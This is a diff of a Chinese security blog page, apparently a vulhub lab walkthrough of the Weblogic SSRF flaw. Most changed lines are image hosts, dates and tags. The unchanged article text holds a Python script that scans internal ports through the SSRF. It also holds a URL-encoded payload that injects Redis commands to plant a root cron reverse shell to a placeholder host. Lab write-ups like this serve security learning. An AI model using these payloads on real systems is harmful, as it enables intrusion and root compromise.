@@ -15,17 +15,17 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="背景Weblogic存在一个SSRF漏洞，可以探测内网服务，也可攻击内网设备">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-03_16-38-14.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-03_16-36-35.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-03_17-03-23.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-03_20-38-48.png">
-<meta property="og:image" content="http://cdn.laohuan.art/2020-07-03_20-42-47.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-07-03_16-38-14.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-07-03_16-36-35.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-07-03_17-03-23.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-07-03_20-38-48.png">
+<meta property="og:image" content="http://qn.laohuan.xin/2020-07-03_20-42-47.png">
 <meta property="article:published_time" content="2020-07-08T12:56:39.000Z">
-<meta property="article:modified_time" content="2021-04-19T03:46:52.873Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:35.985Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="Weblogic">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.laohuan.art/2020-07-03_16-38-14.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/2020-07-03_16-38-14.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -43,7 +43,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -276,24 +276,24 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure>
 
 <p>访问存在的7001端口，会返回404 error code</p>
-<p><img src="http://cdn.laohuan.art/2020-07-03_16-38-14.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-07-03_16-38-14.png" alt></p>
 <p>访问不存在的端口会返回not connect</p>
-<p><img src="http://cdn.laohuan.art/2020-07-03_16-36-35.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-07-03_16-36-35.png" alt></p>
 <p>根据不同端口返回的状态不同，可以来探测内网端口的开放情况</p>
 <p>端口探测脚本</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import thread</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ite_ip(ip):</span><br><span class="line">    for i in range(1, 256):</span><br><span class="line">        final_ip &#x3D; &#39;&#123;ip&#125;.&#123;i&#125;&#39;.format(ip&#x3D;ip, i&#x3D;i)</span><br><span class="line">        print final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(3)</span><br><span class="line"></span><br><span class="line">def scan(final_ip):</span><br><span class="line">    ports &#x3D; (&#39;21&#39;, &#39;22&#39;, &#39;23&#39;, &#39;53&#39;, &#39;80&#39;, &#39;135&#39;, &#39;139&#39;, &#39;443&#39;, &#39;445&#39;, &#39;1080&#39;, &#39;1433&#39;, &#39;1521&#39;, &#39;3306&#39;, </span><br><span class="line">&#39;3389&#39;, &#39;4899&#39;, &#39;8080&#39;, &#39;7001&#39;, &#39;8000&#39;,&#39;6389&#39;,&#39;6379&#39;)</span><br><span class="line">    for port in ports:</span><br><span class="line">        vul_url &#x3D; &#39;http:&#x2F;&#x2F;ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;tx</span><br><span class="line">tSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;%</span><br><span class="line">s:%s&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Se</span><br><span class="line">arch&#39; % (final_ip,port)</span><br><span class="line">        try:</span><br><span class="line">            #print vul_url</span><br><span class="line">            r &#x3D; requests.get(vul_url, timeout&#x3D;15, verify&#x3D;False)</span><br><span class="line">            result1 &#x3D; re.findall(&#39;weblogic.uddi.client.structures.exception.XML_SoapException&#39;,r.conten</span><br><span class="line">t)</span><br><span class="line">            result2 &#x3D; re.findall(&#39;but could not connect&#39;, r.content)</span><br><span class="line">            result3 &#x3D; re.findall(&#39;No route to host&#39;, r.content)  </span><br><span class="line">            if len(result1) !&#x3D; 0 and len(result2) &#x3D;&#x3D; 0 and len(result3) &#x3D;&#x3D; 0:</span><br><span class="line">                print &#39;[!]&#39;+final_ip + &#39;:&#39; + port</span><br><span class="line">        except Exception, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ip &#x3D; &quot;192.168.16&quot;  </span><br><span class="line">    if ip:</span><br><span class="line">        print ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;no ip&quot;</span><br></pre></td></tr></table></figure>
 
 <p>可发现内网开放6379端口，存在redis数据库</p>
-<p><img src="http://cdn.laohuan.art/2020-07-03_17-03-23.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-07-03_17-03-23.png" alt></p>
 <p>写入redis计划任务反弹shell，在<strong>operator</strong>参数添加pyalaod</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;192.168.16.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F反弹ip%2F反弹端口%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
 
 <p>将以上url解码实际为</p>
-<p><img src="http://cdn.laohuan.art/2020-07-03_20-38-48.png" alt></p>
+<p><img src="http://qn.laohuan.xin/2020-07-03_20-38-48.png" alt></p>
 <p>NC监听成功反弹shell</p>
-<p><img src="http://cdn.laohuan.art/2020-07-03_20-42-47.png" alt></p>
-<h4><span id="参考链接">参考链接</span></h4><p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf/" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf/</a></p>
-<p><a href="https://www.jianshu.com/p/42a3bb2b2c2c/" target="_blank" rel="noopener">https://www.jianshu.com/p/42a3bb2b2c2c/</a></p>
+<p><img src="http://qn.laohuan.xin/2020-07-03_20-42-47.png" alt></p>
+<h4><span id="参考链接">参考链接</span></h4><p><a href="http://github.com/vulhub/vulhub/tree/master/weblogic/ssrf/" target="_blank" rel="noopener">http://github.com/vulhub/vulhub/tree/master/weblogic/ssrf/</a></p>
+<p><a href="http://www.jianshu.com/p/42a3bb2b2c2c/" target="_blank" rel="noopener">http://www.jianshu.com/p/42a3bb2b2c2c/</a></p>
 
       
 
@@ -495,7 +495,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -615,6 +615,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -623,7 +627,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -631,7 +643,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -643,7 +655,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -651,7 +663,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,7 +671,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -675,6 +695,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -683,39 +707,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
